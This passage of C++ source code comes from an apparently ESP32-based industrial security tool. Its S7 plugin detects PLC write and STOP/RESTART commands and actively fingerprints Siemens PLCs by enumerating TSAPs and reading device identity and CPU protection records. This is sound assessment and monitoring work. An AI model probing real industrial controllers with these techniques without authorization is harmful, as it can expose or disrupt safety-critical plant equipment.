
#include "s7_plugin.h"
#include "../assessment/fuzzing_engine.h"
#include "../core/reporting_engine.h"
#include "../core/logging_system.h"
#include "../core/psram_json_parser.h"
#include "../security/security_manager.h"

extern "C" {
  #include "lwip/sockets.h"
  #include "lwip/inet.h"
  #include "esp_timer.h"
  #include "esp_netif.h"
  #include "esp_heap_caps.h"
  #include "esp_task_wdt.h"
}

#include <cstring>
#include <map>
#include <fcntl.h>
#include "../core/event_formatter.h"
#include "../assessment/discovery_manager.h"

// Minimal JSON escaping for string values.
static void json_append_escaped(psram_string& out, const char* s) {
    if (!s) return;
    for (const unsigned char* p = (const unsigned char*)s; *p; ++p) {
        const unsigned char c = *p;
        switch (c) {
            case '\\': out.push_back('\\'); out.push_back('\\'); break;
            case '"':  out.push_back('\\'); out.push_back('"'); break;
            case '\b': out.push_back('\\'); out.push_back('b'); break;
            case '\f': out.push_back('\\'); out.push_back('f'); break;
            case '\n': out.push_back('\\'); out.push_back('n'); break;
            case '\r': out.push_back('\\'); out.push_back('r'); break;
            case '\t': out.push_back('\\'); out.push_back('t'); break;
            default:
                if (c < 0x20) {
                    char buf[8];
                    snprintf(buf, sizeof(buf), "\\u%04x", (unsigned)c);
                    out += PSRAMUtils::createPSRAMString(buf);
                } else {
                    out.push_back((char)c);
                }
                break;
        }
    }
}

static psram_string make_finding_json(const char* id,
                                     const char* name,
                                     const char* severity,
                                     const char* description,
                                     const char* recommendation,
                                     const char* status = "detected") {
    PSRAMAllocator<char> alloc;
    psram_string out(alloc);
    out.reserve(256);
    out += PSRAMUtils::createPSRAMString("{\"id\":\"");
    json_append_escaped(out, id ? id : "");
    out += PSRAMUtils::createPSRAMString("\",\"name\":\"");
    json_append_escaped(out, name ? name : "");
    out += PSRAMUtils::createPSRAMString("\",\"severity\":\"");
    json_append_escaped(out, severity ? severity : "INFO");
    out += PSRAMUtils::createPSRAMString("\",\"status\":\"");
    json_append_escaped(out, status ? status : "detected");
    out += PSRAMUtils::createPSRAMString("\",\"description\":\"");
    json_append_escaped(out, description ? description : "");
    out += PSRAMUtils::createPSRAMString("\",\"recommendation\":\"");
    json_append_escaped(out, recommendation ? recommendation : "");
    out += PSRAMUtils::createPSRAMString("\"}");
    return out;
}

// Helper function to convert bytes to hex string
static std::string bytesToHex(const std::vector<uint8_t>& data) {
    static const char kHex[] = "0123456789ABCDEF";
    std::string out;
    if (data.empty()) return out;

    // "AA BB CC" => 3*n-1 chars
    out.reserve(data.size() * 3 - 1);
    for (size_t i = 0; i < data.size(); ++i) {
        if (i) out.push_back(' ');
        const uint8_t b = data[i];
        out.push_back(kHex[(b >> 4) & 0x0F]);
        out.push_back(kHex[b & 0x0F]);
    }
    return out;
}

static bool parse_hex_bytes(const char* s, std::vector<uint8_t>& out) {
    out.clear();
    if (!s) return false;
    auto hex = [](char c) -> int {
        if (c >= '0' && c <= '9') return c - '0';
        if (c >= 'a' && c <= 'f') return 10 + (c - 'a');
        if (c >= 'A' && c <= 'F') return 10 + (c - 'A');
        return -1;
    };
    const char* p = s;
    while (*p) {
        while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n' || *p == ',' || *p == ';') ++p;
        if (!*p) break;
        if (p[0] == '0' && (p[1] == 'x' || p[1] == 'X')) p += 2;
        int hi = hex(*p++);
        if (hi < 0) return false;
        int lo = hex(*p++);
        if (lo < 0) return false;
        out.push_back((uint8_t)((hi << 4) | lo));
        while (*p == ' ' || *p == '\t') ++p;
    }
    return true;
}

static bool parse_json_int_field_free(const std::string& s, const char* key, int& out) {
    if (!key) return false;
    std::string k = std::string("\"") + key + "\"";
    size_t p = s.find(k);
    if (p == std::string::npos) return false;
    p = s.find(':', p);
    if (p == std::string::npos) return false;
    ++p;
    while (p < s.size() && (s[p] == ' ' || s[p] == '\t' || s[p] == '\r' || s[p] == '\n')) ++p;
    bool neg = false;
    if (p < s.size() && s[p] == '-') { neg = true; ++p; }
    long v = 0;
    bool any = false;
    while (p < s.size() && s[p] >= '0' && s[p] <= '9') { any = true; v = v * 10 + (s[p] - '0'); ++p; }
    if (!any) return false;
    if (neg) v = -v;
    out = (int)v;
    return true;
}

static bool parse_json_string_field_free(const std::string& s, const char* key, std::string& out) {
    out.clear();
    if (!key) return false;
    std::string k = std::string("\"") + key + "\"";
    size_t p = s.find(k);
    if (p == std::string::npos) return false;
    p = s.find(':', p);
    if (p == std::string::npos) return false;
    ++p;
    while (p < s.size() && (s[p] == ' ' || s[p] == '\t' || s[p] == '\r' || s[p] == '\n')) ++p;
    if (p >= s.size() || s[p] != '"') return false;
    ++p;
    size_t start = p;
    while (p < s.size() && s[p] != '"') ++p;
    if (p <= start || p >= s.size()) return false;
    out.assign(s.data() + start, p - start);
    return true;
}

static const uint8_t* locate_s7_pdu_free(const uint8_t* buf, size_t len, size_t& out_len) {
    out_len = 0;
    if (!buf || len < 7) return nullptr;
    if (buf[0] != 0x03 || buf[1] != 0x00) return nullptr; // TPKT
    if (len < 5) return nullptr;
    const uint8_t cotp_len = buf[4];
    if (5U + (size_t)cotp_len > len) return nullptr;
    // COTP Length Indicator (LI) is "number of octets following this field".
    // Total COTP header length = 1 (LI itself) + LI.
    const size_t off = 5U + (size_t)cotp_len;
    if (off >= len) return nullptr;
    if (buf[off] != 0x32) return nullptr; // S7 magic
    out_len = len - off;
    return buf + off;
}

static bool recv_all_free(int sock, uint8_t* out, size_t need) {
    size_t got = 0;
    while (got < need) {
        ssize_t n = ::recv(sock, out + got, need - got, 0);
        if (n <= 0) return false;
        got += (size_t)n;
    }
    return true;
}

// Read exactly one TPKT frame (may be split across multiple TCP segments).
// Returns false on timeout/error or if the frame is larger than out_sz.
static bool recv_tpkt_frame_free(int sock, uint8_t* out, size_t out_sz, size_t& out_len) {
    out_len = 0;
    uint8_t hdr[4];
    if (!recv_all_free(sock, hdr, sizeof(hdr))) return false;
    if (hdr[0] != 0x03 || hdr[1] != 0x00) return false;
    const uint16_t total = (uint16_t)((hdr[2] << 8) | hdr[3]);
    if (total < 4) return false;
    if ((size_t)total > out_sz) return false;
    memcpy(out, hdr, sizeof(hdr));
    if (total > 4) {
        if (!recv_all_free(sock, out + 4, (size_t)total - 4U)) return false;
    }
    out_len = (size_t)total;
    return true;
}

static inline void wr16be_free(uint8_t* p, uint16_t v) { p[0] = (uint8_t)((v >> 8) & 0xFF); p[1] = (uint8_t)(v & 0xFF); }
static inline uint16_t rd16be_free(const uint8_t* p) { return (uint16_t)((p[0] << 8) | p[1]); }

static bool s7_send_setup_comm_free_impl(int sock, S7DeviceInfo& dev_info, uint16_t requested_pdu_len) {
    uint8_t setup[] = {
        0x03, 0x00, 0x00, 0x19,
        0x02, 0xF0, 0x80,
        0x32, S7::PDU_TYPE_JOB,
        0x00, 0x00,
        0x00, 0x01,
        0x00, 0x08,
        0x00, 0x00,
        S7::FUNC_SETUP_COMM,
        0x00,
        0x00, 0x01,
        0x00, 0x01,
        0x00, 0x00
    };
    wr16be_free(setup + (sizeof(setup) - 2), requested_pdu_len);
    if (::send(sock, setup, sizeof(setup), 0) != (ssize_t)sizeof(setup)) return false;

    uint8_t rx[512];
    size_t rx_len = 0;
    if (!recv_tpkt_frame_free(sock, rx, sizeof(rx), rx_len)) return false;

    size_t s7_len = 0;
    const uint8_t* s7 = locate_s7_pdu_free(rx, rx_len, s7_len);
    if (!s7 || s7_len < 20) return false;
    if (s7[1] != S7::PDU_TYPE_ACK_DATA) return false;

    // ACK_DATA header: bytes 10..11 = error class/code.
    if (s7[10] != 0x00 || s7[11] != 0x00) {
        return false;
    }

    // Parameters start at 12: [F0][00][max_calling][max_called][pdu_len]
    if (s7[12] != S7::FUNC_SETUP_COMM) return false;
    dev_info.max_jobs_calling = rd16be_free(s7 + 14);
    dev_info.max_jobs_called = rd16be_free(s7 + 16);
    dev_info.asdu_length = rd16be_free(s7 + 18);
    dev_info.setup_comm_success = true;
    return true;
}

static bool s7_send_setup_comm_free(int sock, S7DeviceInfo& dev_info) {
    // Snap7-like: request a conservative PDU first (480), then retry with 960 if needed.
    if (s7_send_setup_comm_free_impl(sock, dev_info, 0x01E0)) return true;
    return s7_send_setup_comm_free_impl(sock, dev_info, 0x03C0);
}

// Helper function to configure TCP socket options for aggressive cleanup
static void configureTcpSocket(int sock) {
    if (sock < 0) return;
    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
#ifdef SO_REUSEPORT
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse));
#endif
#ifdef SO_LINGER
    struct linger ling;
    memset(&ling, 0, sizeof(ling));
    ling.l_onoff = 1;
    ling.l_linger = 0;
    setsockopt(sock, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));
#endif
}

#define TAG_S7 "S7Plugin"

S7Plugin::S7Plugin(EthernetTxIf* tx, SecurityManager* sec)
: BasePlugin("S7Plugin","0.2", ProtocolType::S7_COMM), tx_(tx), sec_(sec) {}

void S7Plugin::loadIDSRules(const std::string& rules_json) {
    (void)rules_json;
    LOG_INFO("S7_PLUGIN", "S7 Communication IDS rules loaded");
}

bool S7Plugin::isPacketWriter(const NetworkPacket& pkt) const {
    // Only requests to TCP/102 can be writers. Avoid flagging responses as "writes".
    if (pkt.dst_port != 102) return false;
    if (!pkt.data || pkt.length < 17) return false;

    size_t s7_len = 0;
    const uint8_t* s7 = locateS7Pdu(pkt.data, pkt.length, s7_len);
    if (!s7 || s7_len < 12) return false;
    if (s7[0] != 0x32) return false;

    const uint8_t rosctr = s7[1];
    const uint16_t par_len = (uint16_t)((s7[6] << 8) | s7[7]);
    const uint16_t dat_len = (uint16_t)((s7[8] << 8) | s7[9]);
    const size_t hdr_len = (rosctr == 0x03) ? 12U : 10U; // Ack_Data carries error class/code
    if (s7_len < hdr_len) return false;
    if (hdr_len + (size_t)par_len + (size_t)dat_len > s7_len) return false;

    const uint8_t* params = s7 + hdr_len;
    const uint8_t* data = s7 + hdr_len + par_len;

    // Job/Ack: first param byte is the function.
    if ((rosctr == 0x01 || rosctr == 0x02 || rosctr == 0x03) && par_len >= 1) {
        const uint8_t func = params[0];
        // Write-related functions (minimal, conservative set).
        if (func == 0x05 || func == 0x1B || func == 0x1D || func == 0x2D) return true;
        return false;
    }

    // Userdata PLC control (STOP/RESTART) is a writer/control action.
    if (rosctr == 0x07 && dat_len >= 12) {
        // Data: FF 09 00 08 + "P_PR" + "OG" + mode + func
        if (data[0] == 0xFF &&
            data[4] == 0x50 && data[5] == 0x5F && data[6] == 0x50 && data[7] == 0x52 && // P_PR
            data[8] == 0x4F && data[9] == 0x47) { // OG
            const uint8_t ctrl = data[11];
            if (ctrl == 0x29 || ctrl == 0x28) return true;
        }
    }

    return false;
}

bool S7Plugin::initialize(ConfigurationManager* cfg, ReportingEngine* rep) {
    cfg_ = cfg; rep_ = rep;
    if (cfg_) {
        // Load security policy flags from config json into SecurityManager (optional)
        if (sec_) {
            size_t cfg_len = 0;
            char* cfg_json = cfg_->getRawConfigInPSRAM(&cfg_len);
            if (cfg_json && cfg_len > 0) {
                sec_->loadPolicyFromConfig(std::string(cfg_json, cfg_json + cfg_len));
            }
            if (cfg_json) {
                heap_caps_free(cfg_json);
            }
        }
    }

    // Register S7-specific event extractor with centralized SessionStateMachine
    getSessionStateMachine().registerProtocolCallbacks(
        SessionEventHelpers::extractS7Event,
        nullptr  // Use default transition validator
    );

    LOG_INFO(TAG_S7, "S7Plugin ready");
    return true;
}

void S7Plugin::shutdown() {
    LOG_INFO(TAG_S7, "S7Plugin shutdown");
}

static inline uint16_t be16(const uint8_t* p){ return (uint16_t)((p[0]<<8)|p[1]); }

bool S7Plugin::isTLSClientHello(const uint8_t* buf, size_t len) {
    if (len < 5) return false;
    return buf[0]==0x16 && buf[1]==0x03 && buf[2] <= 0x03;
}

const uint8_t* S7Plugin::locateS7Pdu(const uint8_t* buf, size_t len, size_t& out_len) {
    out_len = 0;
    if (!buf || len < 7) return nullptr;

    const uint8_t* frame = buf;
    size_t frame_len = len;

    // Accept both direct TPKT and IPv4/TCP encapsulated packets (L2 ingest path).
    if (!(frame[0] == 0x03 && frame[1] == 0x00)) {
        if ((frame[0] >> 4) == 4 && frame_len >= 20) {
            size_t ihl = (size_t)(frame[0] & 0x0F) * 4U;
            if (ihl >= 20 && ihl <= frame_len) {
                uint8_t ip_proto = frame[9];
                if (ip_proto == 6 && frame_len >= ihl + 20) { // TCP
                    const uint8_t* tcp = frame + ihl;
                    size_t doff = (size_t)((tcp[12] >> 4) & 0x0F) * 4U;
                    if (doff >= 20 && frame_len >= ihl + doff) {
                        frame = tcp + doff;
                        frame_len = frame_len - (ihl + doff);
                    }
                }
            }
        }
    }

    if (frame_len < 7) return nullptr;
    if (frame[0] != 0x03 || frame[1] != 0x00) return nullptr; // TPKT
    uint16_t tpkt_len = be16(frame + 2);
    size_t usable = (tpkt_len <= frame_len) ? (size_t)tpkt_len : frame_len;
    if (usable < 5) return nullptr;
    uint8_t cotp_len = frame[4];
    if (5 + (size_t)cotp_len > usable) return nullptr;
    // COTP Length Indicator (LI) is "number of octets following this field".
    // Total COTP header length = 1 (LI itself) + LI.
    size_t off = 5 + cotp_len;
    if (off >= usable) return nullptr;
    if (frame[off] != 0x32) return nullptr; // S7magic
    out_len = usable - off;
    return frame + off;
}

bool S7Plugin::parseS7Function(const uint8_t* s7, size_t sl, uint8_t& rosctr, uint8_t& func) {
    if (sl < 12 || s7[0]!=0x32) return false;
    rosctr = s7[1];
    uint16_t par_len = be16(s7+6);
    if (10 + par_len > sl || par_len==0) return false;
    func = s7[10];
    return true;
}

bool S7Plugin::splitTarget(const std::string& t, std::string& ip, uint16_t& port) {
    ip.clear(); port = 102;
    auto p = t.find(':');
    if (p==std::string::npos) { ip=t; return true; }
    ip = t.substr(0,p);
    int parsed = atoi(t.substr(p+1).c_str());
    port = (parsed > 0 && parsed <= 65535) ? (uint16_t)parsed : 102;
    return true;
}

bool S7Plugin::doHandshake(const std::string& ip, uint16_t port, uint16_t& pdu, std::string& note) {
    pdu = 0; note.clear();
  int sock = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (sock < 0) { note = "socket_error"; return false; }
  configureTcpSocket(sock);
  struct timeval tv{.tv_sec=2,.tv_usec=0};
  ::setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
  ::setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

  // Bind to Ethernet interface (ETH_DEF)
  esp_netif_t* eth = esp_netif_get_handle_from_ifkey("ETH_DEF");
  esp_netif_ip_info_t eth_ip{};
  if (!eth || esp_netif_get_ip_info(eth, &eth_ip) != ESP_OK || eth_ip.ip.addr == 0) {
      ::close(sock); note = "ethernet_not_ready"; return false;
  }
  sockaddr_in local{}; local.sin_family = AF_INET; local.sin_addr.s_addr = eth_ip.ip.addr; local.sin_port = 0;
  ::bind(sock, (sockaddr*)&local, sizeof(local));

  sockaddr_in sa{}; sa.sin_family=AF_INET; sa.sin_port=htons(port);
  if (::inet_aton(ip.c_str(), &sa.sin_addr)==0) { ::close(sock); note="bad_ip"; return false; }
  if (::connect(sock,(sockaddr*)&sa,sizeof(sa))!=0) { ::close(sock); note="connect_fail"; return false; }

    uint8_t cr[] = {
        0x03,0x00,0x00,0x16,
        0x11,0xE0,0x00,0x00,0x00,0x01,0x00,
        0xC1,0x02,0x01,0x00,
        0xC2,0x02,0x01,0x02,
        0xC0,0x01,0x0A
    };
    cr[2]=0x00; cr[3]=(uint8_t)sizeof(cr);
    if (::send(sock, cr, sizeof(cr), 0) != (ssize_t)sizeof(cr)) { ::close(sock); note="cr_send_fail"; return false; }
    uint8_t rx[256]; ssize_t n = ::recv(sock, rx, sizeof(rx), 0);
    if (n <= 0) { ::close(sock); note="cr_no_reply"; return false; }

    uint8_t setup[] = {
        0x03,0x00,0x00,0x19,
        0x02,0xF0,0x80,
        0x32,0x01,
        0x00,0x00,
        0x00,0x01,
        0x00,0x08,
        0x00,0x00,
        0xF0,
        0x00,
        0x00,0x01,
        0x00,0x01,
        0x01,0xE0
    };
    setup[3]=(uint8_t)sizeof(setup);
    if (::send(sock, setup, sizeof(setup), 0) != (ssize_t)sizeof(setup)) { ::close(sock); note="setup_send_fail"; return false; }
    n = ::recv(sock, rx, sizeof(rx), 0);
    if (n <= 0) { ::close(sock); note="no_setup_ack"; return false; }
    size_t sl=0; const uint8_t* s7 = locateS7Pdu(rx, (size_t)n, sl);
    if (!s7) { ::close(sock); note="no_s7_in_ack"; return false; }
    pdu = 480; note="legacy_s7";
    ::close(sock);
    return true;
}

static bool connect_with_timeout(int sock, const sockaddr* addr, socklen_t addrlen, uint32_t timeout_ms) {
    // Non-blocking connect + select() for bounded connect time.
    int flags = fcntl(sock, F_GETFL, 0);
    if (flags < 0) {
        return false;
    }
    if (fcntl(sock, F_SETFL, flags | O_NONBLOCK) != 0) {
        return false;
    }

    int rc = ::connect(sock, addr, addrlen);
    if (rc == 0) {
        // Connected immediately
        (void)fcntl(sock, F_SETFL, flags);
        return true;
    }

    if (errno != EINPROGRESS && errno != EALREADY) {
        (void)fcntl(sock, F_SETFL, flags);
        return false;
    }

    fd_set wfds;
    FD_ZERO(&wfds);
    FD_SET(sock, &wfds);

    struct timeval tv;
    tv.tv_sec = (timeout_ms / 1000U);
    tv.tv_usec = (timeout_ms % 1000U) * 1000U;
    if (tv.tv_sec == 0 && tv.tv_usec == 0) {
        tv.tv_usec = 1; // avoid zero timeout edge cases
    }

    rc = select(sock + 1, nullptr, &wfds, nullptr, &tv);
    if (rc <= 0) {
        (void)fcntl(sock, F_SETFL, flags);
        return false;
    }

    int so_error = 0;
    socklen_t slen = sizeof(so_error);
    if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &slen) != 0) {
        (void)fcntl(sock, F_SETFL, flags);
        return false;
    }

    (void)fcntl(sock, F_SETFL, flags);
    return so_error == 0;
}

bool S7Plugin::activeScanJSON(const std::string& target,
                              std::string& out_json,
                              uint32_t timeout_ms,
                              bool lightweight) {
    std::string ip;
    uint16_t port;
    if (!parseTarget(target, ip, port)) {
        psram_string ps = PSRAMUtils::createPSRAMString("{\"error\":\"invalid_target\"}");
        out_json = PSRAMUtils::fromPSRAMString(ps);
        return false;
    }

    uint32_t io_timeout_ms = timeout_ms;
    if (io_timeout_ms < 500) io_timeout_ms = 500;
    if (io_timeout_ms > 10000) io_timeout_ms = 10000;

    // Bind to Ethernet interface
    esp_netif_t* eth = esp_netif_get_handle_from_ifkey("ETH_DEF");
    esp_netif_ip_info_t eth_ip{};
    if (!eth || esp_netif_get_ip_info(eth, &eth_ip) != ESP_OK || eth_ip.ip.addr == 0) {
        psram_string ps = PSRAMUtils::createPSRAMString("{\"error\":\"ethernet_not_ready\"}");
        out_json = PSRAMUtils::fromPSRAMString(ps);
        return false;
    }

    // Connect to target
    sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    if (::inet_aton(ip.c_str(), &sa.sin_addr) == 0) {
        psram_string ps = PSRAMUtils::createPSRAMString("{\"error\":\"invalid_ip\"}");
        out_json = PSRAMUtils::fromPSRAMString(ps);
        return false;
    }

    auto make_sock = [&](int& sock_out) -> bool {
        sock_out = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock_out < 0) return false;
        configureTcpSocket(sock_out);
        struct timeval tv{.tv_sec = (int)(io_timeout_ms / 1000U), .tv_usec = (int)((io_timeout_ms % 1000U) * 1000U)};
        ::setsockopt(sock_out, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        ::setsockopt(sock_out, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        sockaddr_in local{};
        local.sin_family = AF_INET;
        local.sin_addr.s_addr = eth_ip.ip.addr;
        local.sin_port = 0;
        (void)::bind(sock_out, (sockaddr*)&local, sizeof(local));
        return true;
    };

    auto try_cotp = [&](int sock, uint16_t src_tsap, uint16_t dst_tsap, uint8_t& out_tpdu) -> bool {
        uint8_t cr[] = {
            0x03, 0x00, 0x00, 0x16,              // TPKT
            0x11, 0xE0, 0x00, 0x00, 0x00, 0x01, 0x00,  // COTP CR
            0xC1, 0x02, 0x01, 0x00,              // src-TSAP value at bytes 13..14 (filled)
            0xC2, 0x02, 0x01, 0x02,              // dst-TSAP value at bytes 17..18 (filled)
            0xC0, 0x01, 0x0A                     // TPDU size 1024
        };
        // Fill TSAPs
        // Layout: ... 0xC1 0x02 [src_hi src_lo] 0xC2 0x02 [dst_hi dst_lo] 0xC0 0x01 0x0A
        cr[13] = (uint8_t)((src_tsap >> 8) & 0xFF);
        cr[14] = (uint8_t)(src_tsap & 0xFF);
        cr[17] = (uint8_t)((dst_tsap >> 8) & 0xFF);
        cr[18] = (uint8_t)(dst_tsap & 0xFF);
        cr[3] = (uint8_t)sizeof(cr);

        if (::send(sock, cr, sizeof(cr), 0) != (ssize_t)sizeof(cr)) return false;
        uint8_t rx[256];
        ssize_t n = ::recv(sock, rx, sizeof(rx), 0);
        if (n < 7 || rx[5] != 0xD0) return false; // 0xD0 = CC

        // Best-effort: parse TPDU size parameter (0xC0 0x01 xx) in CC.
        out_tpdu = 0;
        for (ssize_t i = 0; i + 2 < n; ++i) {
            if (rx[i] == 0xC0 && rx[i + 1] == 0x01) {
                out_tpdu = (uint8_t)rx[i + 2];
                break;
            }
        }
        return true;
    };

    const uint64_t t0_ms = (uint64_t)(esp_timer_get_time() / 1000ULL);

    // Try common TSAP combinations.
    // For robust tests, we ALWAYS try both main families:
    // - rack=0 slot=0  -> dst TSAP 0x0100 (S7-1200/1500, depending on the configuration)
    // - rack=0 slot=2  -> dst TSAP 0x0102 (S7-300/400 typical)
    struct TsapAttempt { uint16_t src; uint16_t dst; };
    const TsapAttempt attempts_full[] = {
        {0x0100, 0x0100},
        {0x0100, 0x0102},
        {0x0100, 0x0101},
        {0x0200, 0x0200},
        {0x0100, 0x0200},
        {0x0100, 0x0300},
    };
    const TsapAttempt attempts_light[] = {
        {0x0100, 0x0100},
        {0x0100, 0x0102},
    };
    const TsapAttempt* attempts = lightweight ? attempts_light : attempts_full;
    const size_t attempts_count = lightweight
        ? (sizeof(attempts_light) / sizeof(attempts_light[0]))
        : (sizeof(attempts_full) / sizeof(attempts_full[0]));

    bool tcp_ok = false;
    bool cotp_ok = false;
    uint16_t used_src_tsap = 0;
    uint16_t used_dst_tsap = 0;
    uint8_t used_tpdu = 0;
    bool setup_ok = false;
    bool szl_any = false;
    psram_string attempts_json = PSRAMUtils::createPSRAMString("[");

    int sock = -1;
    for (size_t ai = 0; ai < attempts_count; ++ai) {
        if (!make_sock(sock)) {
            psram_string ps = PSRAMUtils::createPSRAMString("{\"error\":\"socket_failed\"}");
            out_json = PSRAMUtils::fromPSRAMString(ps);
            return false;
        }

        if (!connect_with_timeout(sock, (sockaddr*)&sa, sizeof(sa), timeout_ms)) {
            ::close(sock); sock = -1;
            // Don't bother continuing: TCP/102 not reachable.
            psram_string ps = PSRAMUtils::createPSRAMString("{\"error\":\"connection_timeout\"}");
            out_json = PSRAMUtils::fromPSRAMString(ps);
            return false;
        }
        tcp_ok = true;

        uint8_t tpdu = 0;
        bool ok = try_cotp(sock, attempts[ai].src, attempts[ai].dst, tpdu);

        auto tpdu_bytes = [](uint8_t tpdu_code) -> int {
            // ISO TPDU size is encoded as a power-of-two exponent (commonly 0x0A=1024, 0x0B=2048, 0x0C=4096, 0x0D=8192).
            // Return -1 if the code is not in a reasonable range.
            if (tpdu_code < 7 || tpdu_code > 16) return -1;
            return (int)(1U << tpdu_code);
        };

        char one[240];
        const int tb = tpdu_bytes(tpdu);
        char tb_buf[16];
        if (tb > 0) snprintf(tb_buf, sizeof(tb_buf), "%d", tb);
        snprintf(one, sizeof(one),
                 "%s{\"source_tsap_hex\":\"%04X\",\"destination_tsap_hex\":\"%04X\",\"ok\":%s,"
                 "\"tpdu_size_code_hex\":\"%02X\"%s%s}",
                 (ai ? "," : ""),
                 (unsigned)attempts[ai].src, (unsigned)attempts[ai].dst,
                 ok ? "true" : "false", (unsigned)tpdu,
                 (tb > 0 ? ",\"tpdu_size_bytes\":" : ""),
                 (tb > 0 ? tb_buf : ""));
        attempts_json += PSRAMUtils::createPSRAMString(one);

        if (!ok) {
            ::close(sock); sock = -1;
            continue;
        }

        cotp_ok = true;
        used_src_tsap = attempts[ai].src;
        used_dst_tsap = attempts[ai].dst;
        used_tpdu = tpdu;
        break;
    }
    attempts_json += PSRAMUtils::createPSRAMString("]");

    if (!tcp_ok) {
        psram_string ps = PSRAMUtils::createPSRAMString("{\"error\":\"connect_failed\"}");
        out_json = PSRAMUtils::fromPSRAMString(ps);
        return false;
    }

    if (!cotp_ok) {
        // TCP/102 reachable, but ISO-on-TCP did not confirm for known TSAPs.
        PSRAMAllocator<char> alloc;
        psram_string ps(alloc);
        ps.reserve(512);
        ps += PSRAMUtils::createPSRAMString("{\"target\":\"");
        ps += PSRAMUtils::createPSRAMString(ip.c_str());
        ps += PSRAMUtils::createPSRAMString("\",\"port\":");
        char pb[16]; snprintf(pb, sizeof(pb), "%u", (unsigned)port);
        ps += PSRAMUtils::createPSRAMString(pb);
        ps += PSRAMUtils::createPSRAMString(",\"tcp_connection_ok\":true,\"cotp_connection_confirm_ok\":false,\"connection_attempts\":");
        ps += attempts_json;
        ps += PSRAMUtils::createPSRAMString(",\"error\":\"cotp_connection_confirm_failed\"}");
        out_json = PSRAMUtils::fromPSRAMString(ps);
        return false;
    }

    // Initialize device info structure
    S7DeviceInfo dev_info;
    dev_info.is_online = true;

    // Send S7 Setup Communication
    setup_ok = sendS7SetupComm(sock, dev_info);

    // Read SZL for device identification (best effort - don't fail if it doesn't work)
    if (setup_ok && !lightweight) {
        szl_any = readSZL(sock, S7::SZL_MODULE_IDENTIFICATION, 0x0001, dev_info) || szl_any;
        szl_any = readSZL(sock, S7::SZL_CPU_PROTECTION, 0x0004, dev_info) || szl_any;
        szl_any = readSZL(sock, S7::SZL_COMPONENT_IDENTIFICATION, 0x0001, dev_info) || szl_any;
        szl_any = readSZL(sock, S7::SZL_CPU_CHARACTERISTICS, 0x0001, dev_info) || szl_any;
    }

    ::close(sock);

    const uint64_t t1_ms = (uint64_t)(esp_timer_get_time() / 1000ULL);

    // Build enriched JSON response using PSRAM (single payload, no cJSON).
    PSRAMAllocator<char> alloc;
    psram_string ps(alloc);
    ps.reserve(1024);
    ps += PSRAMUtils::createPSRAMString("{\"target\":\"");
    ps += PSRAMUtils::createPSRAMString(ip.c_str());
    ps += PSRAMUtils::createPSRAMString("\",\"port\":");
    char pb[16]; snprintf(pb, sizeof(pb), "%u", (unsigned)port);
    ps += PSRAMUtils::createPSRAMString(pb);
    ps += PSRAMUtils::createPSRAMString(",\"timeout_ms\":");
    char tb[24]; snprintf(tb, sizeof(tb), "%u", (unsigned)timeout_ms);
    ps += PSRAMUtils::createPSRAMString(tb);
    ps += PSRAMUtils::createPSRAMString(",\"duration_ms\":");
    snprintf(tb, sizeof(tb), "%llu", (unsigned long long)(t1_ms - t0_ms));
    ps += PSRAMUtils::createPSRAMString(tb);

    ps += PSRAMUtils::createPSRAMString(",\"tcp_connection_ok\":");
    ps += PSRAMUtils::createPSRAMString(tcp_ok ? "true" : "false");
    ps += PSRAMUtils::createPSRAMString(",\"cotp_connection_confirm_ok\":");
    ps += PSRAMUtils::createPSRAMString(cotp_ok ? "true" : "false");
    ps += PSRAMUtils::createPSRAMString(",\"connection_attempts\":");
    ps += attempts_json;

    {
        auto tpdu_bytes = [](uint8_t tpdu_code) -> int {
            if (tpdu_code < 7 || tpdu_code > 16) return -1;
            return (int)(1U << tpdu_code);
        };
        const int tb = tpdu_bytes(used_tpdu);
        char tb_buf[16];
        if (tb > 0) snprintf(tb_buf, sizeof(tb_buf), "%d", tb);
        char tsbuf[220];
        snprintf(tsbuf, sizeof(tsbuf),
                 ",\"selected_source_tsap_hex\":\"%04X\",\"selected_destination_tsap_hex\":\"%04X\","
                 "\"selected_tpdu_size_code_hex\":\"%02X\"%s%s",
                 (unsigned)used_src_tsap, (unsigned)used_dst_tsap, (unsigned)used_tpdu,
                 (tb > 0 ? ",\"selected_tpdu_size_bytes\":" : ""),
                 (tb > 0 ? tb_buf : ""));
        ps += PSRAMUtils::createPSRAMString(tsbuf);
    }

    ps += PSRAMUtils::createPSRAMString(",\"s7_setup_comm_ok\":");
    ps += PSRAMUtils::createPSRAMString(setup_ok ? "true" : "false");
    ps += PSRAMUtils::createPSRAMString(",\"szl_any_ok\":");
    ps += PSRAMUtils::createPSRAMString(szl_any ? "true" : "false");
    ps += PSRAMUtils::createPSRAMString(",\"scan_mode\":\"");
    ps += PSRAMUtils::createPSRAMString(lightweight ? "lightweight" : "full");
    ps += PSRAMUtils::createPSRAMString("\"");

    // Embed device info snapshot (best-effort fields)
    ps += PSRAMUtils::createPSRAMString(",\"device\":{");
    ps += PSRAMUtils::createPSRAMString("\"module_type\":\""); json_append_escaped(ps, dev_info.module_type); ps += PSRAMUtils::createPSRAMString("\",");
    ps += PSRAMUtils::createPSRAMString("\"order_code\":\""); json_append_escaped(ps, dev_info.order_code); ps += PSRAMUtils::createPSRAMString("\",");
    ps += PSRAMUtils::createPSRAMString("\"firmware\":\""); json_append_escaped(ps, dev_info.firmware_version); ps += PSRAMUtils::createPSRAMString("\",");
    ps += PSRAMUtils::createPSRAMString("\"serial\":\""); json_append_escaped(ps, dev_info.serial_number); ps += PSRAMUtils::createPSRAMString("\",");
    char dbuf[128];
